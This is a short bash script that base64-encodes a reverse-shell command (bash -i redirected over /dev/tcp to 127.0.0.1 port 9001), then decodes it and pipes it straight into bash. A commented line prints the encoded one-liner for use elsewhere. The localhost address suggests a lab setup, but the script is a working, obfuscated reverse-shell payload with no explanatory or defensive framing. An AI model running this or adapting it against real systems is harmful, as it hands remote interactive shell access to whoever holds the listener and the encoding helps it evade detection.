#!/bin/bash

shellb64=$(echo 'bash -i  >& /dev/tcp/127.0.0.1/9001   0>&1' | base64 -w 0)

#echo "echo $shellb64|base64 -d|bash"
echo $shellb64|base64 -d|bash
